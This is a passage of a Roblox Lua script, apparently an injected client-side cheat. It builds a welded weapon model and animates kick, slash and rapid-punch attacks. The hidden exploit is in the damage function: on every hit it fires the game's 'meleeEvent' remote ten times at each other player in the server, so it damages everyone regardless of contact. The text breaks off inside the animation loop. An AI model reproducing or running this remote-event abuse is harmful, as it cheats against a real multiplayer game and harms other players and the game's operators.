Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.000889778137, -1.19647264, -0.611890316, 0.999999464, -0.000899367849, 0.000441022159, 0.00089937041, 0.999999762, -4.05865558e-006, -0.00044113741, 4.45527257e-006, 0.999999464))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 1.60000002, 0.600000024))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.600500584, -1.09640455, -0.201779842, 1.00000012, -2.32830644e-010, -4.30736691e-008, -2.32830644e-010, 1.00000012, -2.45790943e-010, -4.30736691e-008, -2.45790943e-010, 0.999999642))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(1, 0.200000003, 0.200000003))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.000306606293, -0.377037287, -0.601670265, 0.999999762, 0.00031651766, -0.000155181624, -0.000316517428, 1.00000012, -4.67921154e-006, 0.000155075802, 4.72837655e-006, 0.999999821))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 0.180000007))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.600499153, -0.196920633, -0.00151586533, 1.00000012, -2.32830644e-010, -4.30736691e-008, -2.32830644e-010, 1.00000012, -2.45790943e-010, -4.30736691e-008, -2.45790943e-010, 0.999999642))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 1.60000002, 0.600000024))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.599459648, -1.09671283, -0.201775074, 1.00000012, -2.32830644e-010, -4.30736691e-008, -2.32830644e-010, 1.00000012, -2.45790943e-010, -4.30736691e-008, -2.45790943e-010, 0.999999642))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Cyan","Part",Vector3.new(0.200000003, 0.600000024, 0.200000003))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.603309631, 0.79431057, 0.19979763, 0.000441345328, 1.02001377e-006, -0.999999583, -0.0014804157, -0.999999166, -1.67312442e-006, -0.999998629, 0.00148036075, -0.000441501907))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Cyan","Part",Vector3.new(0.200000003, 0.800000072, 0.200000003))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.602658272, 0.895184755, 0.599769115, -0.00044106209, -1.06590051e-006, 0.999999404, -0.00148006494, -0.999999106, -1.78377411e-006, 0.999998808, -0.00148006494, 0.000441099808))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Cyan","Part",Vector3.new(0.200000003, 0.800000072, 0.200000003))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.603645325, 0.895176172, 0.598274708, 0.000441031589, -1.06463622e-005, -0.999999106, -0.00366260204, -0.999993503, 9.0968615e-006, -0.999993086, 0.00366259739, -0.000441047887))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.59949255, -0.200006008, -8.10623169e-006, 1.00000012, -2.32830644e-010, -4.30736691e-008, -2.32830644e-010, 1.00000012, -2.45790943e-010, -4.30736691e-008, -2.45790943e-010, 0.999999642))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 1, 0.400000036))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.602900505, 0.794560432, 0.699896812, 0.000277848565, -4.8027523e-006, -0.999999285, -0.000562647125, -0.999999702, 4.62732169e-006, -0.999999464, 0.000562645728, -0.000277688028))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.600000024, 0.400000036))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.601531029, -1.59454489, 0.704492569, 0.000275437254, -3.86590182e-006, -0.999999583, 0.00458068866, 0.999989569, -2.6046348e-006, 0.999989331, -0.00458068773, 0.000275452854))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 1, 0.400000036))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.601531506, 0.794553995, 0.703287125, -0.000277835759, 3.93840037e-006, 0.999999225, -0.00458001066, -0.999989331, 2.68569465e-006, 0.999988854, -0.0045800088, 0.000277791754))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Cyan","Part",Vector3.new(0.200000003, 0.400000036, 0.200000003))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.602654457, -1.49517679, 0.599338055, 0.000441032287, 1.03119532e-006, -0.999999523, 0.00148038787, 0.999999344, 1.68376937e-006, 0.999998808, -0.00148038717, 0.000441099808))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.600000024, 0.400000036))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.602901459, -1.59455109, 0.701107502, -0.000275434693, 4.862879e-006, 0.999999583, 0.00056196982, 0.99999994, -4.70873238e-006, -0.999999642, 0.000561968191, -0.00027549779))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Cyan","Part",Vector3.new(0.200000003, 0.600000083, 0.200000003))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.602984428, 0.794746876, 0.200193405, -0.000441434851, -1.05554568e-006, 0.999999642, -0.00148058624, -0.999999166, -1.70890337e-006, 0.999998391, -0.00148053118, 0.000441248238))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Cyan","Part",Vector3.new(0.200000003, 0.400000036, 0.200000003))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.603648663, -1.49516833, 0.597844124, -0.00044106174, 1.06116586e-005, 0.999999285, 0.00366228004, 0.999993742, -8.99647875e-006, -0.999993086, 0.00366227515, -0.000441047887))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Cyan","Part",Vector3.new(0.200000003, 0.600000024, 0.200000003))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.602815151, -1.59496284, 0.399338245, 0.000441032287, 1.03119532e-006, -0.999999523, 0.00148038787, 0.999999344, 1.68376937e-006, 0.999998808, -0.00148038717, 0.000441099808))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Cyan","Part",Vector3.new(0.200000003, 0.600000024, 0.200000003))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.603466988, -1.59408998, 0.40066433, -0.000441091426, -9.23018206e-007, 0.999999285, 0.00148090266, 0.999999344, 1.57579962e-006, -0.99999845, 0.00148090185, -0.000441129145))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))

Damagefunc=function(hit,minim,maxim,knockback,Type,Property,Delay,KnockbackType,decreaseblock)
        if hit.Parent==nil then
                return
        end
        h=hit.Parent:FindFirstChild("Humanoid")
        for _,v in pairs(hit.Parent:children()) do
        if v:IsA("Humanoid") then
        h=v
        end
        end
        if hit.Parent.Parent:FindFirstChild("Torso")~=nil then
        h=hit.Parent.Parent:FindFirstChild("Humanoid")
        end
        if hit.Parent.className=="Hat" then
        hit=hit.Parent.Parent:findFirstChild("Head")
        end
        if h~=nil and hit.Parent.Name~=Character.Name and hit.Parent:FindFirstChild("Torso")~=nil then
        if hit.Parent:findFirstChild("DebounceHit")~=nil then if hit.Parent.DebounceHit.Value==true then return end end
        --[[                if game.Players:GetPlayerFromCharacter(hit.Parent)~=nil then
                        return
                end]]
--                        hs(hit,1.2) 
                        c=Instance.new("ObjectValue")
                        c.Name="creator"
                        c.Value=game:service("Players").LocalPlayer
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
                Damage=math.random(minim,maxim)
--                h:TakeDamage(Damage)
                blocked=false
                block=hit.Parent:findFirstChild("Block")
                if block~=nil then
                print(block.className)
                if block.className=="NumberValue" then
                if block.Value>0 then
                blocked=true
                if decreaseblock==nil then
                block.Value=block.Value-1
                end
                end
                end
                if block.className=="IntValue" then
                if block.Value>0 then
                blocked=true
                if decreaseblock~=nil then
                block.Value=block.Value-1
                end
                end
                end
                end
                if blocked==false then
		spawn(function()
                            for i, plr in pairs(game.Players:GetChildren()) do
                                if plr.Name ~= game.Players.LocalPlayer.Name then
                                    for i = 1, 10 do
                                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                                    end
                                end
                            end
                  end)
--                h:TakeDamage(Damage)
--                h.Health=h.Health-Damage
                showDamage(hit.Parent,Damage,.5,BrickColor.new("Toothpaste"))
                else
		spawn(function()
                            for i, plr in pairs(game.Players:GetChildren()) do
                                if plr.Name ~= game.Players.LocalPlayer.Name then
                                    for i = 1, 10 do
                                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                                    end
                                end
                            end
                  end)
--                h.Health=h.Health-(Damage/2)
                showDamage(hit.Parent,Damage/2,.5,BrickColor.new("Bright blue"))
                end
                if Type=="Knockdown" then
                hum=hit.Parent.Humanoid
hum.PlatformStand=true
coroutine.resume(coroutine.create(function(HHumanoid)
swait(1)
HHumanoid.PlatformStand=false
end),hum)
                local angle=(hit.Position-(Property.Position+Vector3.new(0,0,0))).unit
--hit.CFrame=CFrame.new(hit.Position,Vector3.new(angle.x,hit.Position.y,angle.z))*CFrame.fromEulerAnglesXYZ(math.pi/4,0,0)
local bodvol=Instance.new("BodyVelocity")
bodvol.velocity=angle*knockback
bodvol.P=5000
bodvol.maxForce=Vector3.new(8e+003, 8e+003, 8e+003)
bodvol.Parent=hit
rl=Instance.new("BodyAngularVelocity")
rl.P=3000
rl.maxTorque=Vector3.new(500000,500000,500000)*50000000000000
rl.angularvelocity=Vector3.new(math.random(-10,10),math.random(-10,10),math.random(-10,10))
rl.Parent=hit
game:GetService("Debris"):AddItem(bodvol,.5)
game:GetService("Debris"):AddItem(rl,.5)
                elseif Type=="Normal" then
                vp=Instance.new("BodyVelocity")
                vp.P=500
                vp.maxForce=Vector3.new(math.huge,0,math.huge)
--                vp.velocity=Character.Torso.CFrame.lookVector*Knockback
                if KnockbackType==1 then
                vp.velocity=Property.CFrame.lookVector*knockback+Property.Velocity/1.05
                elseif KnockbackType==2 then
                vp.velocity=Property.CFrame.lookVector*knockback
                end
                if knockback>0 then
                        vp.Parent=hit.Parent.Torso
                end
                game:GetService("Debris"):AddItem(vp,.5)
                elseif Type=="Up" then
                local bodyVelocity=Instance.new("BodyVelocity")
                bodyVelocity.velocity=vt(0,60,0)
                bodyVelocity.P=5000
                bodyVelocity.maxForce=Vector3.new(8e+003, 8e+003, 8e+003)
                bodyVelocity.Parent=hit
                game:GetService("Debris"):AddItem(bodyVelocity,1)
                rl=Instance.new("BodyAngularVelocity")
                rl.P=3000
                rl.maxTorque=Vector3.new(500000,500000,500000)*50000000000000
                rl.angularvelocity=Vector3.new(math.random(-30,30),math.random(-30,30),math.random(-30,30))
                rl.Parent=hit
                game:GetService("Debris"):AddItem(rl,.5)
                elseif Type=="Snare" then
                bp=Instance.new("BodyPosition")
                bp.P=2000
                bp.D=100
                bp.maxForce=Vector3.new(math.huge,math.huge,math.huge)
                bp.position=hit.Parent.Torso.Position
                bp.Parent=hit.Parent.Torso
                game:GetService("Debris"):AddItem(bp,1)
                elseif Type=="Target" then
                if Targetting==false then
                ZTarget=hit.Parent.Torso
                coroutine.resume(coroutine.create(function(Part) 
                so("http://www.roblox.com/asset/?id=15666462",Part,1,1.5) 
                swait(5)
                so("http://www.roblox.com/asset/?id=15666462",Part,1,1.5) 
                end),ZTarget)
                TargHum=ZTarget.Parent:findFirstChild("Humanoid")
                targetgui=Instance.new("BillboardGui")
                targetgui.Parent=ZTarget
                targetgui.Size=UDim2.new(10,100,10,100)
                targ=Instance.new("ImageLabel")
                targ.Parent=targetgui
                targ.BackgroundTransparency=1
                targ.Image="rbxassetid://4834067"
                targ.Size=UDim2.new(1,0,1,0)
                cam.CameraType="Scriptable"
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                dir=Vector3.new(cam.CoordinateFrame.lookVector.x,0,cam.CoordinateFrame.lookVector.z)
                workspace.CurrentCamera.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                Targetting=true
                RocketTarget=ZTarget
                for i=1,Property do
                --while Targetting==true and Humanoid.Health>0 and Character.Parent~=nil do
                if Humanoid.Health>0 and Character.Parent~=nil and TargHum.Health>0 and TargHum.Parent~=nil and Targetting==true then
                swait()
                end
                --workspace.CurrentCamera.CoordinateFrame=CFrame.new(Head.CFrame.p,Head.CFrame.p+rmdir*100)
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                dir=Vector3.new(cam.CoordinateFrame.lookVector.x,0,cam.CoordinateFrame.lookVector.z)
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)*cf(0,5,10)*euler(-0.3,0,0)
                end
                Targetting=false
                RocketTarget=nil
                targetgui.Parent=nil
                cam.CameraType="Custom"
                end
                end
                        debounce=Instance.new("BoolValue")
                        debounce.Name="DebounceHit"
                        debounce.Parent=hit.Parent
                        debounce.Value=true
                        game:GetService("Debris"):AddItem(debounce,Delay)
                        c=Instance.new("ObjectValue")
                        c.Name="creator"
                        c.Value=Player
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
                CRIT=false
                hitDeb=true
                AttackPos=6
        end
end
 
showDamage=function(Char,Dealt,du,Color)
        m=Instance.new("Model")
        m.Name=tostring(Dealt)
        h=Instance.new("Humanoid")
        h.Health=0
        h.MaxHealth=0
        h.Parent=m
        c=Instance.new("Part")
        c.Transparency=0
        c.BrickColor=Color
        c.Name="Head"
        c.TopSurface=0
        c.BottomSurface=0
        c.formFactor="Plate"
        c.Size=Vector3.new(1,.4,1)
        ms=Instance.new("CylinderMesh")
        ms.Scale=Vector3.new(.8,.8,.8)
        if CRIT==true then
                ms.Scale=Vector3.new(1,1.25,1)
        end
        ms.Parent=c
        c.Reflectance=0
        Instance.new("BodyGyro").Parent=c
        c.Parent=m
        if Char:findFirstChild("Head")~=nil then
        c.CFrame=CFrame.new(Char["Head"].CFrame.p+Vector3.new(0,1.5,0))
        elseif Char.Parent:findFirstChild("Head")~=nil then
        c.CFrame=CFrame.new(Char.Parent["Head"].CFrame.p+Vector3.new(0,1.5,0))
        end
        f=Instance.new("BodyPosition")
        f.P=2000
        f.D=100
        f.maxForce=Vector3.new(math.huge,math.huge,math.huge)
        f.position=c.Position+Vector3.new(0,3,0)
        f.Parent=c
        game:GetService("Debris"):AddItem(m,.5+du)
        c.CanCollide=false
        m.Parent=workspace
        c.CanCollide=false
end

function PlaySound(id, pitch, parent, volume)
if volume == nil then volume=tonumber(1) end
        epicsound = Instance.new("Sound")
        epicsound.Name = "Epicosound"
  epicsound.SoundId = "rbxassetid://"..id
     epicsound.Volume = volume
     epicsound.Pitch = pitch
  epicsound.Looped = false
  epicsound.Parent = parent
  sbu = epicsound:Clone()
  sbu.Parent = Storage
	 wait()
	 epicsound:Play()
	game:service'Debris':AddItem(epicsound, 8)
end

Slashes = {200633108, 200633148, 200633196,200633281}

Slash = function(part)
local shot=math.random(1, #Slashes)
PlaySound(Slashes[shot], 1, part)
end

local Shockwave = function()
    local Wave = Instance.new("Part", m)
    Wave.Name = "Shockwave"
    Wave.BrickColor = BrickColor.new("Black")
    Wave.Size = Vector3.new(1, 1, 1)
    Wave.Shape = "Ball"
    Wave.CanCollide = false
    Wave.Anchored = true
    Wave.TopSurface = 0
    Wave.BottomSurface = 0
    Wave.Touched:connect(function(hit)
        if hit.Parent:findFirstChild("Humanoid") and hit.Parent:findFirstChild("Torso") then
            if hit.Parent.Name ~= Character.Name and hit.Parent.Parent~=mon then
                hit.Parent:findFirstChild("Humanoid").Health = hit.Parent:findFirstChild("Humanoid").Health - 5
                hit.Parent:findFirstChild("Torso").Velocity = hit.Parent:findFirstChild("Torso").CFrame.lookVector * -120
            end
        end
    end)
    Instance.new("SpecialMesh", Wave).MeshType = "Sphere"
    Delay(0, function()
           for i = 1, 38, 1 do
                Wave.Size = Vector3.new(1 + i, 1 + i, 1 + i)
                Wave.CFrame = Torso.CFrame
                local t = i / 38
                Wave.Transparency = t
                wait()
            end
        Wave:Destroy()
    end)
    Delay(0, function()
        while wait() do
            if Wave ~= nil then
                Wave.CFrame = Wave.CFrame
            else
                break
            end
        end
    end)
end

hits={144650218,135436482,183345423,200561185}

function atktype(s,e)
	coroutine.resume(coroutine.create(function()
		attacktype = e
		wait(.5)
		attacktype = s
	end))
end

mouse.Button1Down:connect(function()
        if attack==false and attacktype==1 then
                attacktype=2
                attackone()
        elseif attack==false and attacktype==2 then
                attacktype=1
                attacktwo()
        end
end)

mouse.KeyDown:connect(function(k)
	if k=='e' and attack==false then
		kick()
	elseif k=='r' and attack==false then
		rapunch()
	end
end)

function kick()
	attack=true
	Humanoid.WalkSpeed=0
	so("http://roblox.com/asset/?id=200632136",RightLeg,1,1) 
	con1=RightLeg.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(30,50),"Normal",RootPart,.2,1) end) 
	for i=0,1,0.1 do
		swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*angles(math.rad(-25),math.rad(0),math.rad(0)),.37)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(25),math.rad(0),math.rad(0)),.37)
		RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(65),math.rad(0),math.rad(-35)),.37)
		LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(-65),math.rad(0),math.rad(-25)),.37)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(125)),.37)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(25)),.37)
	end
	attack=false
	Humanoid.WalkSpeed=16
	con1:disconnect()
end

function attackone()
	attack=true
	con1=HitboxA.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(1,2),"Normal",RootPart,.2,1) end) 
	--[[for i=0,1,0.1 do
		swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*angles(math.rad(0),math.rad(0),math.rad(-45)),.37)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(0),math.rad(0),math.rad(45)),.37)
		RW.C0=clerp(RW.C0,cf(1,0.5,-.5)*angles(math.rad(90),math.rad(90),math.rad(0))*angles(math.rad(45),math.rad(0),math.rad(0)),.37)
		LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(90),math.rad(-90),math.rad(0))*angles(math.rad(-55),math.rad(0),math.rad(0)),.37)
		RH.C0=clerp(RH.C0,cf(.8,-1,-.3)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(0),math.rad(45),math.rad(0)),.37)
		LH.C0=clerp(LH.C0,cf(-.8,-1,.3)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(0),math.rad(45),math.rad(0)),.37)
	end
	for i=0,1,0.1 do
		swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*angles(math.rad(0),math.rad(0),math.rad(75)),.37)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(0),math.rad(0),math.rad(-75)),.37)
		RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(55),math.rad(90),math.rad(0))*angles(math.rad(-25),math.rad(0),math.rad(0)),.37)
		LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(-15),math.rad(0),math.rad(-15))*angles(math.rad(0),math.rad(0),math.rad(0)),.37)
		RH.C0=clerp(RH.C0,cf(.5,-1,.3)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(0),math.rad(-75),math.rad(0)),.37)
		LH.C0=clerp(LH.C0,cf(-.5,-1,-.3)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(0),math.rad(-75),math.rad(0)),.37)
	end]]
	Torso.Velocity=Head.CFrame.lookVector*50
    Slash(HitboxA)
	for i=0,1,0.1 do
		swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*angles(math.rad(0),math.rad(0),math.rad(85)),.37)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(0),math.rad(0),math.rad(-85)),.37)
		RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(90),math.rad(90),math.rad(0))*angles(math.rad(-75),math.rad(0),math.rad(0)),.37)
		LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(-15),math.rad(0),math.rad(-15))*angles(math.rad(0),math.rad(0),math.rad(0)),.37)
		RH.C0=clerp(RH.C0,cf(.5,-1,.3)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(0),math.rad(-85),math.rad(0)),.37)
		LH.C0=clerp(LH.C0,cf(-.5,-1,-.3)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(0),math.rad(-85),math.rad(0)),.37)
	end
	attack=false
	con1:disconnect()
end

function attacktwo()
	attack=true
	con1=HitboxB.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(1,2),"Normal",RootPart,.2,1) end) 
	Slash(HitboxB)
	for i=0,1,0.1 do
		swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*angles(math.rad(0),math.rad(0),math.rad(-65)),.37)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(0),math.rad(0),math.rad(65)),.37)
		RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(15),math.rad(0),math.rad(15))*angles(math.rad(0),math.rad(0),math.rad(0)),.37)
		LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(75),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(0),math.rad(-45)),.37)
		RH.C0=clerp(RH.C0,cf(.7,-1,-.3)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(0),math.rad(65),math.rad(0)),.37)
		LH.C0=clerp(LH.C0,cf(-.7,-1,.3)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(0),math.rad(65),math.rad(0)),.37)
	end
	attack=false
	con1:disconnect()
end

function rapunch()
	attack=true
	con1=HitboxA.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(1,2),"Normal",RootPart,.2,1) end) 
	con2=HitboxB.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(1,2),"Normal",RootPart,.2,1) end) 
	for i=0,10 do
		Slash(HitboxA)
		for i=0,.4,0.1 do
			swait()
			RootJoint.C0=clerp(RootJoint.C0,RootCF*angles(math.rad(0),math.rad(0),math.rad(-65)),.7)
			Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(0),math.rad(0),math.rad(65)),.7)
			RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(15),math.rad(0),math.rad(15))*angles(math.rad(0),math.rad(0),math.rad(0)),.7)
			LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(75),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(0),math.rad(-45)),.7)
			RH.C0=clerp(RH.C0,cf(.7,-1,-.3)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(0),math.rad(65),math.rad(0)),.7)
			LH.C0=clerp(LH.C0,cf(-.7,-1,.3)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(0),math.rad(65),math.rad(0)),.7)
		end
		Slash(HitboxB)
		for i=0,.4,0.1 do
			swait()
			RootJoint.C0=clerp(RootJoint.C0,RootCF*angles(math.rad(0),math.rad(0),math.rad(85)),.7)
			Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(0),math.rad(0),math.rad(-85)),.7)
			RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(90),math.rad(90),math.rad(0))*angles(math.rad(-75),math.rad(0),math.rad(0)),.7)
			LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(-15),math.rad(0),math.rad(-15))*angles(math.rad(0),math.rad(0),math.rad(0)),.7)
			RH.C0=clerp(RH.C0,cf(.5,-1,.3)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(0),math.rad(-85),math.rad(0)),.7)
			LH.C0=clerp(LH.C0,cf(-.5,-1,-.3)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(0),math.rad(-85),math.rad(0)),.7)
		end
	end
	attack=false
	con1:disconnect()
	con2:disconnect()
end

local sine = 0
local change = 1
local val = 0

while true do
	swait()
	sine = sine + change
	local torvel=(RootPart.Velocity*Vector3.new(1,0,1)).magnitude 
	local velderp=RootPart.Velocity.y
	hitfloor,posfloor=rayCast(RootPart.Position,(CFrame.new(RootPart.Position,RootPart.Position - Vector3.new(0,1,0))).lookVector,4,Character)
	if equipped==true or equipped==false then
		if attack==false then
			idle=idle+1
		else
			idle=0
		end
		if idle>=500 then
			if attack==false then
				--Sheath()
			end
		end
		if RootPart.Velocity.y > 1 and hitfloor==nil then 
			Anim="Jump"
			if attack==false then
				Neck.C0=clerp(Neck.C0,necko*euler(-0.2,0,0),.3)
				Neck.C1=clerp(Neck.C1,necko2*euler(0,0,0),.3)
				RootJoint.C0=clerp(RootJoint.C0,RootCF*euler(0,0,0),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(-.5,0,0.5),.3)
				RW.C1=clerp(LW.C1,cf(0,0.5,0)*euler(0,0,0),.3)
				LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(-.5,0,-0.5),.3)
				LW.C1=clerp(LW.C1,cf(0,0.5,0)*euler(0,0,0),.3)
				RH.C0=clerp(RH.C0,cf(1,-1,-.3)*euler(-0.5,1.57,0)*euler(-.2,0,0),.2)
				LH.C0=clerp(LH.C0,cf(-1,-1,-.3)*euler(-0.5,-1.57,0)*euler(-.2,0,0),.2)
			end
		elseif RootPart.Velocity.y < -1 and hitfloor==nil then 
			Anim="Fall"
			if attack==false then
				Neck.C0=clerp(Neck.C0,necko*euler(0.4,0,0),.3)
				Neck.C1=clerp(Neck.C1,necko2*euler(0,0,0),.3)
				RootJoint.C0=clerp(RootJoint.C0,RootCF*euler(0,0,0),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(0.3,0,0.2),.3)
